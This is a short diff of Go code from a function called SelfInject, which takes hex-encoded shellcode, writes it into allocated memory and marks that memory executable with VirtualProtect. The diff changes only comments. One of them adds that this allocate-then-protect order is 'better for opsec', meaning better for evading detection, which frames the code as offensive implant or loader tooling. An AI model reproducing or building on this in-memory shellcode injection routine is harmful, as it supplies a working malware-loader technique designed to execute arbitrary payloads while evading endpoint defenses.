@@ -25,11 +25,11 @@ func SelfInject(shellcodeHex string) string {
 		return "[!] Failed to allocate memory: " + err.Error()
 	}
 
-	// Copy the shellcode into our assigned region of RWX memory
+	// Copy the shellcode into our assigned region of RW memory
 	WriteMemory(shellcode, executableMemory)
 
 	var oldfperms uint32
-	// Mark shellcode as executable
+	// Mark shellcode as executable, better for opsec to do it this way
 	err = windows.VirtualProtect(executableMemory, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldfperms)
 	if err != nil {
 		return "[!] Failed to change protections on memory: " + err.Error()
